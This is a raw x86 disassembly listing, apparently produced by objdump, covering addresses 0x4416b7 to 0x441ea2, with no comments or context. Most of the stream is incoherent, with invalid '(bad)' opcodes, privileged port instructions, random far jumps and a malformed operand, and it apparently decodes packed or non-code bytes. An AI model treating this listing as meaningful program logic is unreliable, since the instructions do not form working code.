  4416b7:	and    ecx,0x65
  4416ba:	mov    esi,0xfab264b0
  4416bf:	adc    eax,ebp
  4416c1:	repz jb 0x4416d2
  4416c4:	jmp    0x3207b62a
  4416c9:	ror    DWORD PTR [esi+0x4f5ed840],cl
  4416cf:	test   al,0xd7
  4416d1:	popa   
  4416d2:	fst    DWORD PTR [esi-0x56]
  4416d5:	fnsave [edx]
  4416d7:	add    ch,BYTE PTR [edx+esi*4-0x6]
  4416db:	adc    eax,ebp
  4416dd:	repz jb 0x4416ee
  4416e0:	jmp    0x6b07b646
  4416e5:	ss cmp eax,0xa6002d84
  4416eb:	retf   
  4416ec:	add    DWORD PTR [edi+0x6],esp
  4416ef:	call   0x7de7fff4
  4416f4:	les    esi,FWORD PTR ds:0x2dc40e12
  4416fa:	mov    dl,0xe
  4416fc:	les    edi,FWORD PTR [esp+eiz*8+0x59a48b2d]
  441703:	push   esp
  441704:	mov    BYTE PTR [ebp+0x6af73a48],al
  44170a:	pop    edi
  44170b:	iret   
  44170c:	jbe    0x4416ce
  44170e:	in     al,dx
  44170f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441710:	mov    esi,DWORD PTR [ebp+esi*1-0x7c07448]
  441717:	or     al,0xe2
  441719:	jb     0x441749
  44171b:	rcr    BYTE PTR [esi-0x20],cl
  44171e:	xchg   ecx,eax
  44171f:	or     BYTE PTR [esi],0xe9
  441722:	popa   
  441723:	shr    BYTE PTR [esi+0x119d8300],1
  441729:	add    BYTE PTR [ebx],cl
  44172b:	dec    ebx
  44172c:	inc    edi
  44172d:	adc    al,0x83
  44172f:	fld    DWORD PTR [edi]
  441731:	sysexit 
  441733:	mov    ebp,0xd5fb16ae
  441738:	stc    
  441739:	inc    eax
  44173a:	xlat   BYTE PTR ds:[ebx]
  44173b:	dec    edx
  44173c:	aas    
  44173d:	adc    al,0x40
  44173f:	xchg   bh,bh
  441741:	xchg   DWORD PTR [edi-0x206f83bc],edi
  441747:	aas    
  441748:	idiv   edi
  44174a:	cld    
  44174b:	adc    eax,0x9b00b113
  441750:	sub    edi,DWORD PTR [ebp+0x7d07c866]
  441756:	dec    ebp
  441757:	stos   DWORD PTR es:[edi],eax
  441758:	push   edx
  441759:	mov    ch,0xf3
  44175b:	adc    al,dh
  44175d:	mov    ebx,0x7dd58b16
  441762:	push   ebp
  441763:	scas   eax,DWORD PTR es:[edi]
  441764:	outs   dx,DWORD PTR ds:[esi]
  441765:	jle    0x441717
  441767:	and    eax,DWORD PTR [eax-0x9]
  44176a:	call   FWORD PTR [ebp+0x7a]
  44176d:	pop    ebp
  44176e:	add    ebx,esp
  441770:	pop    edx
  441771:	in     al,dx
  441772:	(bad)  
  441773:	cld    
  441774:	push   edx
  441775:	ret    
  441776:	add    al,0x9e
  441778:	xchg   edx,eax
  441779:	popa   
  44177a:	mov    edx,DWORD PTR [esi]
  44177c:	xor    DWORD PTR [ecx-0x2d],esp
  44177f:	test   eax,0xc203b65f
  441784:	fs mov ebx,0x7ddd3b16
  44178a:	dec    ebp
  44178b:	sbb    eax,DWORD PTR [ebx+0x32b38ffe]
  441791:	idiv   edi
  441793:	shl    BYTE PTR [ecx+0xb],0x6a
  441797:	cmp    al,BYTE PTR ds:0xfb7cfb46
  44179d:	je     0x441763
  44179f:	bound  eax,QWORD PTR [esi-0x40]
  4417a2:	mov    esp,0xcb47d71e
  4417a7:	push   ss
  4417a8:	out    dx,eax
  4417a9:	inc    edi
  4417aa:	retf   
  4417ab:	cs pop es
  4417ad:	dec    eax
  4417ae:	retf   
  4417af:	es push esi
  4417b1:	xchg   bl,ch
  4417b3:	add    cl,bl
  4417b5:	jge    0x4417c2
  4417b7:	pop    ebx
  4417b8:	sti    
  4417b9:	not    BYTE PTR [esi]
  4417bb:	clc    
  4417bc:	fld    QWORD PTR [esi-0xa5934b0]
  4417c2:	test   ebx,ebp
  4417c4:	fscale 
  4417c6:	add    al,0x85
  4417c8:	ficomp DWORD PTR [esi-0x6]
  4417cb:	(bad)  
  4417cc:	mov    ebp,0x62fffe5c
  4417d1:	inc    edx
  4417d2:	test   eax,0xbad3c0cc
  4417d7:	mov    ecx,0x34263
  4417dc:	add    al,0x29
  4417de:	jae    0x441797
  4417e0:	ins    BYTE PTR es:[edi],dx
  4417e1:	inc    edx
  4417e2:	add    edi,DWORD PTR [ebp-0x75]
  4417e5:	adc    eax,0xf8554ba1
  4417ea:	je     0x4417a3
  4417ec:	push   esp
  4417ed:	inc    edx
  4417ee:	add    eax,DWORD PTR [ebp+0x47841612]
  4417f4:	pop    edx
  4417f5:	mov    edx,0x12630f00
  4417fa:	out    dx,eax
  4417fb:	or     BYTE PTR [edx+ebx*2],dl
  4417fe:	pop    ebx
  4417ff:	adc    DWORD PTR [edx+0x42],esp
  441802:	test   BYTE PTR [edi+0x76],al
  441805:	mov    ebx,0x3dda07ac
  44180a:	repnz test dl,dl
  44180d:	mov    ch,0xfa
  44180f:	push   DWORD PTR ds:0x95139341
  441815:	mov    cl,0xec
  441817:	and    eax,0x5ed91800
  44181c:	push   es
  44181d:	(bad)  
  44181e:	fldl2t 
  441820:	test   eax,0x466a4826
  441825:	(bad)  
  441826:	popa   
  441827:	jns    0x441889
  441829:	jae    0x441804
  44182b:	jmp    0x41b4fcd9
  441830:	cli    
  441831:	cmc    
  441832:	aaa    
  441833:	mov    gs,WORD PTR [esp+eiz*2]
  441836:	pop    esp
  441837:	sub    BYTE PTR ds:0xf99d60dd,al
  44183d:	fnsave [edi]
  44183f:	jb     0x4417cc
  441841:	sbb    edi,ecx
  441843:	jmp    0x3f4f974b
  441848:	xor    eax,0x73f0bea7
  44184d:	cmc    
  44184e:	into   
  44184f:	jmp    0xe0764f57
  441854:	mov    eax,ds:0x7b6fe818
  441859:	in     eax,dx
  44185a:	into   
  44185b:	jmp    0xedccff63
  441860:	mov    WORD PTR ds:0x5cff61e1,ds
  441866:	ficomp DWORD PTR [ecx]
  441868:	clc    
  441869:	pop    edx
  44186a:	outs   dx,DWORD PTR ds:[esi]
  44186b:	popa   
  44186c:	pop    edx
  44186d:	push   ebx
  44186e:	fldl2t 
  441870:	mov    WORD PTR ds:0x65b362cd,ds
  441876:	popa   
  441877:	(bad)
  44187a:	(bad)  
  44187b:	cmc    
  44187c:	mov    WORD PTR [eax],es
  44187e:	in     eax,dx
  44187f:	jne    0x441870
  441881:	add    esp,DWORD PTR [edx+0x68]
  441884:	stc    
  441885:	aam    0x53
  441887:	add    al,0x24
  441889:	test   eax,0x456a4816
  44188e:	xor    ah,BYTE PTR [ecx+0x59]
  441891:	pop    edi
  441892:	push   ebx
  441893:	fld    DWORD PTR [eax]
  441895:	jmp    0x71f47895
  44189a:	sub    esi,DWORD PTR [edi]
  44189c:	test   edi,0x99e993de
  4418a2:	js     0x4418d5
  4418a4:	imul   DWORD PTR [edx-0x60]
  4418a7:	fst    DWORD PTR [esi+0x60]
  4418aa:	fnstenv [edx+0xe]
  4418ad:	jmp    0x1099a513
  4418b2:	and    dh,BYTE PTR [eax]
  4418b4:	div    esi
  4418b6:	pushf  
  4418b7:	and    al,ah
  4418b9:	sbb    eax,0xb5c42295
  4418be:	xor    ah,BYTE PTR [edx]
  4418c0:	les    ebp,FWORD PTR [ebp+0x3cc42232]
  4418c6:	fld    DWORD PTR [edx+0x51]
  4418c9:	cmp    bl,cl
  4418cb:	xchg   ebx,eax
  4418cc:	adc    BYTE PTR [edi],bl
  4418ce:	jmp    0x14ae217e
  4418d3:	pop    edx
  4418d4:	add    cl,ch
  4418d6:	popa   
  4418d7:	(bad)  [edi-0x5a]
  4418da:	fwait
  4418db:	xor    al,BYTE PTR [eax]
  4418dd:	jmp    0x3abaf243
  4418e2:	add    cl,ch
  4418e4:	lock adc DWORD PTR [esi],0xffffff92
  4418e8:	xor    al,0x6c
  4418ea:	loope  0x441925
  4418ec:	dec    eax
  4418ed:	clc    
  4418ee:	xchg   BYTE PTR [ebp+0x5f],bl
  4418f1:	aas    
  4418f2:	int    0xd2
  4418f4:	pop    eax
  4418f5:	sbb    dl,ah
  4418f7:	popa   
  4418f8:	fst    DWORD PTR [eax-0x7f]
  4418fb:	lea    ebp,ds:0x5ff366f7
  441901:	sbb    al,0xf2
  441903:	popa   
  441904:	fst    DWORD PTR [ecx+0x41]
  441907:	cmp    DWORD PTR ds:0x19e14ef7,ebp
  44190d:	or     BYTE PTR [eax],al
  44190f:	mov    al,0x9f
  441911:	fbld   TBYTE PTR [ecx]
  441913:	jbe    0x4418eb
  441915:	clc    
  441916:	mov    ecx,DWORD PTR [ebp+0x3b0011c5]
  44191c:	arpl   WORD PTR [ecx+0xda1dac],cx
  441922:	or     DWORD PTR [ecx-0x1d],0x75
  441926:	rol    DWORD PTR [ecx],0x9d
  441929:	fld    QWORD PTR [ebx]
  44192b:	cmp    al,BYTE PTR [esi*8+0x2cd5ce88]
  441932:	retf   0xdf6c
  441935:	fld    QWORD PTR [ebx]
  441937:	xchg   BYTE PTR [edx],ah
  441939:	add    cl,BYTE PTR [ebx+0x434484a]
  44193f:	sbb    BYTE PTR [ebx+0x21501b70],0xb
  441946:	test   DWORD PTR [eax],eax
  441948:	sti    
  441949:	dec    ebp
  44194a:	adc    ecx,DWORD PTR [ebx+0x53503116]
  441950:	pop    ebx
  441951:	outs   dx,DWORD PTR ds:[esi]
  441952:	fbstp  TBYTE PTR [ecx-0x7c07290a]
  441958:	jmp    FWORD PTR [ecx]
  44195a:	fimul  WORD PTR [edx+edi*4-0x27]
  44195e:	add    BYTE PTR [ebx-0x89dfb],al
  441964:	mov    ebx,ebp
  441966:	or     DWORD PTR [esi+ebp*1-0x4fffff26],eax
  44196d:	lahf   
  44196e:	or     BYTE PTR [esi+edx*1-0xfffff26],al
  441975:	arpl   WORD PTR [ebx+0x7dd97b16],di
  44197b:	jge    0x44190c
  44197d:	dec    eax
  44197e:	push   eax
  44197f:	add    al,0xc8
  441981:	aad    0xa
  441983:	jle    0x44199e
  441985:	jg     0x441a03
  441987:	ret    0x2462
  44198a:	xor    bl,bh
  44198c:	fst    DWORD PTR [edi+ebp*8+0x61]
  441990:	imul   eax,esp,0x5b
  441993:	adc    DWORD PTR [edx+0x42],esp
  441996:	push   es
  441997:	mov    dl,0xcc
  441999:	stos   BYTE PTR es:[edi],al
  44199a:	in     eax,dx
  44199b:	jmp    DWORD PTR ds:0xea07bdb8
  4419a1:	fdivp  st(5),st
  4419a3:	clc    
  4419a4:	pushf  
  4419a5:	cs push es
  4419a7:	mov    dl,0xec
  4419a9:	mov    ebp,ebp
  4419ab:	inc    DWORD PTR [eax]
  4419ad:	add    eax,0xe913bdb8
  4419b2:	ins    BYTE PTR es:[edi],dx
  4419b3:	or     ecx,DWORD PTR [eax-0x7e75d5aa]
  4419b9:	scas   al,BYTE PTR es:[edi]
  4419ba:	adc    al,0x3
  4419bc:	add    ch,ah
  4419be:	jl     0x4419af
  4419c0:	scas   al,BYTE PTR es:[edi]
  4419c1:	jb     0x44198b
  4419c3:	inc    esp
  4419c4:	popa   
  4419c5:	mov    cl,0x8
  4419c7:	cmp    DWORD PTR [edi-0x4481462f],0x6203426c
  4419d1:	jmp    0x441967
  4419d3:	push   esp
  4419d4:	adc    DWORD PTR [edx+0x42],esp
  4419d7:	sub    BYTE PTR [esp+eax*2],cl
  4419da:	dec    edi
  4419db:	and    ah,BYTE PTR [ecx+0x5b]
  4419de:	mov    WORD PTR [ecx+edx*1+0x62],ss
  4419e2:	inc    edx
  4419e3:	cmp    BYTE PTR [esi-0x4479569f],0x74
  4419ea:	inc    edx
  4419eb:	add    eax,DWORD PTR [ebp-0x767699e1]
  4419f1:	dec    edx
  4419f2:	daa    
  4419f3:	add    eax,DWORD PTR [eax]
  4419f5:	jmp    0x62491a86
  4419fa:	inc    edx
  4419fb:	ret    
  4419fc:	dec    edi
  4419fd:	and    edx,ecx
  4419ff:	ret    0x4a4d
  441a02:	fnstenv [ebp+0x64345a12]
  441a08:	xchg   ch,ah
  441a0a:	loope  0x4419f5
  441a0c:	add    esi,DWORD PTR [edx+0x785766]
  441a12:	cmp    eax,0xdeb2e934
  441a17:	sbb    dl,BYTE PTR [ecx-0x73]
  441a1a:	ds xor al,0x2e
  441a1d:	and    DWORD PTR [ecx],0x1d8a40cd
  441a23:	xor    al,0xe9
  441a25:	mov    bl,ch
  441a27:	je     0x441a18
  441a29:	add    esp,DWORD PTR [edx+0x60]
  441a2c:	mov    edi,?
  441a2e:	fcomp  DWORD PTR [ebx-0x1a0b7f15]
  441a34:	jg     0x4419e7
  441a36:	and    DWORD PTR [eax+0x19],0xffffffa6
  441a3a:	push   ds
  441a3b:	aaa    
  441a3c:	(bad)  
  441a3d:	into   
  441a3e:	push   ecx
  441a3f:	mov    ebx,0xcb1575e0
  441a44:	jmp    0x77af854c
  441a49:	pop    ebx
  441a4a:	jae    0x441a25
  441a4c:	jmp    0x62254dd9
  441a51:	jmp    FWORD PTR [esp+esi*1+0x27]
  441a55:	clc    
  441a56:	push   0x6b
  441a58:	push   edi
  441a59:	pop    edx
  441a5a:	push   ebx
  441a5b:	fldl2t 
  441a5d:	mov    BYTE PTR [ebx],bl
  441a5f:	int    0x62
  441a61:	mov    ch,0x65
  441a63:	popa   
  441a64:	std    
  441a65:	repnz fimul WORD PTR [edx+0x55]
  441a69:	cmc    
  441a6a:	lea    esi,[ebx]
  441a6c:	mov    es,ebp
  441a6e:	jno    0x441ada
  441a70:	stc    
  441a71:	jmp    0x2bded51d
  441a76:	add    dh,dh
  441a78:	push   ss
  441a79:	jp     0x441a05
  441a7b:	shl    DWORD PTR [eax+eax*1-0x21],cl
  441a7f:	popa   
  441a80:	fstp   DWORD PTR [esi+0x60]
  441a83:	out    0x6a,eax
  441a85:	push   cs
  441a86:	jmp    0xc75756ec
  441a8b:	xchg   edx,eax
  441a8c:	adc    bl,BYTE PTR [esi-0x20]
  441a8f:	fild   QWORD PTR [edx+0xe]
  441a92:	jmp    0xeb05cef8
  441a97:	call   0x621bcefc
  441a9c:	fldcw  WORD PTR [eax-0x7f]
  441a9f:	sbb    ebx,esi
  441aa1:	add    cl,al
  441aa3:	or     DWORD PTR [edi+0x18eae940],edx
  441aa9:	call   0xf7758d97
  441aae:	push   0xffffff9d
  441ab0:	fimul  DWORD PTR [ebx-0x21c7b6c9]
  441ab6:	push   es
  441ab7:	push   esi
  441ab8:	push   edi
  441ab9:	div    DWORD PTR [ebp+0x66]
  441abc:	pop    esp
  441abd:	mov    esi,0xf7292a01
  441ac2:	out    dx,al
  441ac3:	sbb    DWORD PTR [ecx-0x707c8da5],edx
  441ac9:	ret    
  441aca:	lods   eax,DWORD PTR ds:[esi]
  441acb:	sbb    bl,BYTE PTR [esi]
  441acd:	les    edi,FWORD PTR [edx*8+0x6e1c8b3e]
  441ad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441ad5:	mov    esp,DWORD PTR [esi+ebp*4]
  441ad8:	mov    DWORD PTR [ebx+0x412700c0],ecx
  441ade:	adc    BYTE PTR [eax+0x7f],ch
  441ae1:	xor    edi,esi
  441ae3:	jmp    0xe93fcf49
  441ae8:	repnz add eax,0xe05a248c
  441aee:	scas   al,BYTE PTR es:[edi]
  441aef:	stc    
  441af0:	pop    esp
  441af1:	sbb    eax,DWORD PTR [ecx+0x315790]
  441af7:	add    BYTE PTR [ebx-0x2d7efeb4],cl
  441afd:	int3   
  441afe:	clc    
  441aff:	add    BYTE PTR [ebx-0x25],bh
  441b02:	out    dx,eax
  441b03:	or     esp,0x4b00f8cc
  441b09:	dec    esp
  441b0a:	add    DWORD PTR [ecx+0xf8cc9c],eax
  441b10:	cmp    esp,DWORD PTR [ebx-0x40]
  441b13:	shr    DWORD PTR [ebx-0x75f4a7d3],0x72
  441b1a:	pop    edx
  441b1b:	ret    0xd63f
  441b1e:	push   edx
  441b1f:	mov    esp,esi
  441b21:	fld    DWORD PTR [ebx-0x741c290a]
  441b27:	inc    esi
  441b28:	or     dh,BYTE PTR [eax+0x58]
  441b2b:	pop    ebx
  441b2c:	into   
  441b2d:	fwait
  441b2e:	or     eax,DWORD PTR [eax]
  441b30:	js     0x441b04
  441b32:	pop    es
  441b33:	jae    0x441afd
  441b35:	pop    eax
  441b36:	int3   
  441b37:	je     0x441b52
  441b39:	popa   
  441b3a:	mov    ds:0xd5fb24,eax
  441b3f:	add    BYTE PTR [eax],al
  441b41:	cld    
  441b42:	xchg   DWORD PTR [ecx],eax
  441b44:	add    eax,DWORD PTR [ebx-0x6f070be9]
  441b4a:	dec    eax
  441b4b:	repnz add edx,0xbb00f8cc
  441b52:	dec    ebx
  441b53:	add    DWORD PTR [ecx+0xf8cca2],eax
  441b59:	retf   
  441b5a:	lea    esp,[esi-0x80]
  441b5d:	les    edx,FWORD PTR [ebp-0x10]
  441b60:	out    0xfa,eax
  441b62:	add    ecx,DWORD PTR [ecx]
  441b64:	mov    ecx,ecx
  441b66:	pushf  
  441b67:	xlat   BYTE PTR ds:[ebx]
  441b68:	add    al,0xb0
  441b6a:	fwait
  441b6b:	hlt    
  441b6c:	(bad)  
  441b6d:	dec    ebp
  441b6e:	pushf  
  441b6f:	xlat   BYTE PTR ds:[ebx]
  441b70:	adc    BYTE PTR [edx-0x15],ah
  441b73:	pop    es
  441b74:	mov    edi,0xb3f0519
  441b79:	(bad)
  441b7e:	inc    eax
  441b7f:	add    ecx,DWORD PTR [ecx]
  441b81:	loopne 0x441bd0
  441b83:	add    eax,DWORD PTR [eax]
  441b85:	(bad)  
  441b86:	jmp    0xdc12:0x18c4a66a
  441b8d:	and    ecx,DWORD PTR [ebp+0x36af8706]
  441b93:	jl     0x441b79
  441b95:	repnz and eax,0x7bfa0003
  441b9b:	cld    
  441b9c:	jmp    DWORD PTR [edx-0x43]
  441b9f:	xchg   edi,eax
  441ba0:	and    esp,DWORD PTR [edx+0x37]
  441ba3:	push   ecx
  441ba4:	adc    DWORD PTR [eax],eax
  441ba6:	popa   
  441ba7:	cld    
  441ba8:	or     dh,BYTE PTR [edx-0x901be54]
  441bae:	popa   
  441baf:	in     al,dx
  441bb0:	or     dh,BYTE PTR [edx-0x901bb54]
  441bb6:	popa   
  441bb7:	cld    
  441bb8:	or     dh,BYTE PTR [edx-0x901bc74]
  441bbe:	popa   
  441bbf:	in     al,dx
  441bc0:	or     dh,BYTE PTR [edx-0x901c174]
  441bc6:	popa   
  441bc7:	cld    
  441bc8:	or     dh,BYTE PTR [edx-0x903c2d4]
  441bce:	popa   
  441bcf:	ins    BYTE PTR es:[edi],dx
  441bd0:	or     DWORD PTR [edx-0x903bfd4],esi
  441bd6:	popa   
  441bd7:	jl     0x441be2
  441bd9:	mov    dl,0xc
  441bdb:	aas    
  441bdc:	cld    
  441bdd:	mul    BYTE PTR [ecx+0x6c]
  441be0:	or     DWORD PTR [edx-0x903c5f4],esi
  441be6:	popa   
  441be7:	jl     0x441bf2
  441be9:	mov    dl,0x2c
  441beb:	f2xm1  
  441bed:	add    al,0x95
  441bef:	fdiv   QWORD PTR [ebx-0x1c782ff7]
  441bf5:	add    al,0x75
  441bf7:	fsub   QWORD PTR [ebx-0xd784ff7]
  441bfd:	add    al,0x75
  441bff:	fdiv   QWORD PTR [ebx-0x22784ff7]
  441c05:	add    al,0x55
  441c07:	fsub   QWORD PTR [ebx-0x78effff7]
  441c0d:	in     al,dx
  441c0e:	add    al,0x55
  441c10:	fdiv   QWORD PTR [ebx]
  441c12:	or     DWORD PTR [eax],edx
  441c14:	xchg   edi,ebx
  441c16:	add    al,0x35
  441c18:	fsub   QWORD PTR [ebx]
  441c1a:	or     eax,esi
  441c1c:	xchg   dh,ch
  441c1e:	add    al,0x35
  441c20:	fdiv   QWORD PTR [ebx]
  441c22:	add    eax,0xf4275c2d
  441c27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441c28:	loopne 0x441c86
  441c2a:	xchg   ecx,eax
  441c2b:	sbb    dh,BYTE PTR [eax]
  441c2d:	push   ds
  441c2e:	pop    esp
  441c2f:	jl     0x441c8a
  441c31:	fiadd  WORD PTR [ebx+0x2e283a12]
  441c37:	push   0xffffffc2
  441c39:	cmp    ecx,DWORD PTR [ecx]
  441c3b:	bound  esi,QWORD PTR [eax]
  441c3d:	inc    BYTE PTR [esp]
  441c40:	jno    0x441cba
  441c42:	and    DWORD PTR [edx+0x59],0xfffffff6
  441c46:	and    BYTE PTR [ebx+eax*2],bl
  441c49:	(bad)  
  441c4a:	stos   BYTE PTR es:[edi],al
  441c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441c4c:	fucomip st,st(1)
  441c4e:	sbb    dl,cl
  441c50:	fninit 
  441c52:	sbb    BYTE PTR [eax],bl
  441c54:	fstp   st(6)
  441c56:	jle    0x441cce
  441c58:	xor    dh,al
  441c5a:	sbb    al,ah
  441c5c:	adc    ebp,esi
  441c5e:	jg     0x441bfc
  441c60:	fsubr  st,st(1)
  441c62:	add    esp,DWORD PTR [edi]
  441c64:	xor    al,0x0
  441c66:	fldcw  WORD PTR [edx-0x51]
  441c69:	(bad)  
  441c6a:	jmp    0xaacff5d0
  441c6f:	add    BYTE PTR [eax],ah
  441c71:	cmp    ah,bh
  441c73:	imul   esp,ebp,0xfffffffb
  441c76:	add    dh,ah
  441c78:	adc    ecx,edx
  441c7a:	add    esp,DWORD PTR [ebx-0x17b19496]
  441c80:	data16 sub BYTE PTR [ebx],al
  441c83:	mov    bl,0x5a
  441c85:	imul   ecx,DWORD PTR [esi-0x15],0x66
  441c89:	add    esp,DWORD PTR es:[ebx-0x15b19496]
  441c90:	add    si,WORD PTR es:[ebx]
  441c94:	pop    edx
  441c95:	imul   ecx,DWORD PTR [esi-0x13],0x66
  441c99:	add    esp,DWORD PTR es:[ebx]
  441c9c:	push   0x6b
  441c9e:	dec    esi
  441c9f:	in     al,dx
  441ca0:	add    si,WORD PTR es:[ebx]
  441ca4:	pop    edx
  441ca5:	imul   ecx,DWORD PTR [esi-0x11],0x66
  441ca9:	add    esp,DWORD PTR es:[ebx]
  441cac:	push   0x6b
  441cae:	dec    esi
  441caf:	out    dx,al
  441cb0:	add    si,WORD PTR es:[ebx]
  441cb4:	pop    edx
  441cb5:	imul   ecx,DWORD PTR [esi-0x1f],0x66
  441cb9:	add    esp,DWORD PTR es:[ebx]
  441cbc:	push   0x6b
  441cbe:	dec    esi
  441cbf:	lock add si,WORD PTR es:[ebx]
  441cc4:	pop    edx
  441cc5:	imul   ecx,DWORD PTR [esi-0x1d],0x66
  441cc9:	add    esp,DWORD PTR es:[ebx]
  441ccc:	push   0x6b
  441cce:	dec    esi
  441ccf:	repnz pusha 
  441cd1:	add    esi,DWORD PTR es:[ebx+0x4e6b5d00]
  441cd8:	in     eax,0x60
  441cda:	add    esp,DWORD PTR es:[ebx+0x4e6b5d]
  441ce1:	mov    dh,0xdb
  441ce3:	out    dx,eax
  441ce4:	add    esi,ecx
  441ce6:	(bad)  
  441ce7:	mov    dl,0x56
  441ce9:	test   ebx,ebx
  441ceb:	out    dx,eax
  441cec:	add    eax,ecx
  441cee:	(bad)  
  441cef:	mov    dl,0x56
  441cf1:	xchg   esp,eax
  441cf2:	fucomi st,st(7)
  441cf4:	add    edx,ecx
  441cf6:	pop    edx
  441cf7:	fcom   QWORD PTR [eax]
  441cf9:	mov    ch,cl
  441cfb:	je     0x441cc3
  441cfd:	jnp    0x441d21
  441cff:	or     BYTE PTR [ebp-0x73891],al
  441d05:	(bad)  
  441d06:	icebp  
  441d07:	jae    0x441d14
  441d09:	inc    esp
  441d0a:	pushf  
  441d0b:	add    DWORD PTR [ebx],eax
  441d0d:	add    ebp,DWORD PTR [edi-0xc]
  441d10:	clc    
  441d11:	adc    BYTE PTR [ecx-0xe],cl
  441d14:	mov    eax,0x80005a2a
  441d19:	pushf  
  441d1a:	hlt    
  441d1b:	mov    dh,0xea
  441d1d:	adc    al,0x7d
  441d1f:	lds    ecx,FWORD PTR [edi]
  441d21:	cmp    eax,edi
  441d23:	clc    
  441d24:	add    esi,DWORD PTR [ecx-0x73]
  441d27:	data16 or BYTE PTR [edx+ebx*2],0xf0
  441d2c:	out    0x4a,eax
  441d2e:	add    ecx,DWORD PTR [ecx]
  441d30:	imul   ecx,DWORD PTR [ecx-0x2a],0xda64ff00
  441d37:	out    dx,al
  441d38:	mov    eax,DWORD PTR [eax]
  441d3a:	dec    esp
  441d3b:	addr16 mov dh,0xe0
  441d3e:	sti    
  441d3f:	data16 cld 
  441d41:	rol    al,0x70
  441d44:	mov    ch,0xc
  441d46:	sti    
  441d47:	xchg   ebp,eax
  441d48:	retf   
  441d49:	int3   
  441d4a:	(bad)  
  441d4b:	(bad)  
  441d4c:	jmp    0x441da4
  441d4e:	inc    eax
  441d4f:	dec    eax
  441d50:	pop    es
  441d51:	test   DWORD PTR [ebp+0x768b065d],ebp
  441d57:	fnstsw WORD PTR [ebp+0x45]
  441d5a:	bound  esi,QWORD PTR [edx+ebp*8]
  441d5d:	(bad)  
  441d5e:	call   0x6357a892
  441d63:	add    BYTE PTR [edi-0x4632528e],bh
  441d69:	mov    esp,0xeb8bccae
  441d6e:	jmp    0x9bc7263f
  441d73:	retf   
  441d74:	or     DWORD PTR [ebp+0x4688281f],eax
  441d7a:	bound  edi,QWORD PTR [esi+0x3]
  441d7d:	add    BYTE PTR [edx],ah
  441d7f:	stc    
  441d80:	xchg   ecx,eax
  441d81:	test   BYTE PTR [edi],0x83
  441d84:	aas    
  441d85:	retf   
  441d86:	xchg   esi,eax
  441d87:	jnp    0x441dc8
  441d89:	retf   
  441d8a:	cs into 
  441d8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441d8d:	push   ecx
  441d8e:	mov    cl,0xbf
  441d90:	pop    ds
  441d91:	and    ebx,ecx
  441d93:	outs   dx,BYTE PTR ds:[esi]
  441d94:	xlat   BYTE PTR ds:[ebx]
  441d95:	aaa    
  441d96:	fnstcw WORD PTR [esi-0x29]
  441d99:	cmp    ebp,ecx
  441d9b:	sbb    BYTE PTR [ebx-0x7127ff7c],0x3
  441da2:	add    BYTE PTR [edx-0x29],ah
  441da5:	inc    ebx
  441da6:	test   BYTE PTR [eax-0x61aa75da],ah
  441dac:	data16 add bh,BYTE PTR [edi-0x4135bef7]
  441db3:	add    DWORD PTR [ebx],esi
  441db5:	or     bl,al
  441db7:	fld    TBYTE PTR [esi]
  441db9:	xlat   BYTE PTR ds:[ebx]
  441dba:	test   al,ah
  441dbc:	mov    dl,0x3
  441dbe:	add    BYTE PTR [edx-0x49],ah
  441dc1:	mov    ecx,0x8ffa2973
  441dc6:	std    
  441dc7:	fdivr  st,st(2)
  441dc9:	test   BYTE PTR [ebx-0x7a],bl
  441dcc:	or     cl,BYTE PTR [edx-0x78466593]
  441dd2:	and    esp,DWORD PTR [esi-0x27]
  441dd5:	jb     0x441d81
  441dd7:	cmp    DWORD PTR [esi+0x55],ebx
  441dda:	iret   
  441ddb:	mov    ebp,0x55e04d61
  441de0:	pusha  
  441de1:	sahf   
  441de2:	or     eax,0x1c95895
  441de7:	fst    QWORD PTR [ebp-0x68191003]
  441ded:	std    
  441dee:	out    0x63,al
  441df0:	fucompp 
  441df2:	add    eax,DWORD PTR [edi+0x41]
  441df5:	push   ds
  441df6:	add    dh,BYTE PTR [edi]
  441df8:	ds jb  0x441dbd
  441dfb:	cmc    
  441dfc:	popa   
  441dfd:	and    eax,0x99d859e0
  441e02:	mov    eax,DWORD PTR [eax]
  441e04:	icebp  
  441e05:	hlt    
  441e06:	icebp  
  441e07:	add    al,0xb3
  441e09:	int3   
  441e0a:	jo     0x441dc4
  441e0c:	or     ecx,0xf1b94cde
  441e12:	mov    bp,WORD PTR [ecx-0x3077120b]
  441e19:	cdq    
  441e1a:	jb     0x441e0c
  441e1c:	add    DWORD PTR [eax-0x14],0xad99c86
  441e23:	dec    edx
  441e24:	pop    edx
  441e25:	fs in  eax,dx
  441e27:	les    ebp,FWORD PTR [esi+0x1e]
  441e2a:	out    0x7d,al
  441e2c:	cmp    eax,0x9503e9d9
  441e31:	aas    
  441e32:	jmp    0xee702b3a
  441e37:	mov    esi,DWORD PTR [ecx]
  441e39:	fldl2t 
  441e3b:	add    ebp,DWORD PTR [ebx+0x64]
  441e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441e3f:	sar    dl,cl
  441e41:	out    dx,eax
  441e42:	sub    cl,BYTE PTR [edi-0x205a9ff8]
  441e48:	popa   
  441e49:	fsubr  QWORD PTR [esi]
  441e4b:	add    ch,bl
  441e4d:	out    dx,al
  441e4e:	add    BYTE PTR [ebp+0x1e6ddbb5],ch
  441e54:	fld    st(7)
  441e56:	sbb    al,0x72
  441e58:	aad    0xf7
  441e5a:	cld    
  441e5b:	jno    0x441e32
  441e5d:	mul    DWORD PTR [eax]
  441e5f:	jmp    0x65b2:0x53c5550
  441e66:	clc    
  441e67:	mov    DWORD PTR [eax],0x7d85314e
  441e6d:	mov    ecx,0x61e901d3
  441e72:	pusha  
  441e73:	lods   al,BYTE PTR ds:[esi]
  441e74:	stc    
  441e75:	pop    ecx
  441e76:	sub    al,0xf7
  441e78:	jmp    0xda76f657
  441e7d:	jge    0x441e64
  441e7f:	ins    DWORD PTR es:[edi],dx
  441e80:	std    
  441e81:	jmp    0x3a97:0x92e53297
  441e88:	in     eax,dx
  441e89:	aam    0xd8
  441e8b:	sub    DWORD PTR [ebx-0x7d165997],0xfffffff0
  441e92:	lods   eax,DWORD PTR ds:[esi]
  441e93:	ret    0xb8e5
  441e96:	xor    edi,esi
  441e98:	jmp    0x6a42c4fe
  441e9d:	mov    ds:0x3141c02c,eax
  441ea2:	inc    DWORD PTR [ecx]
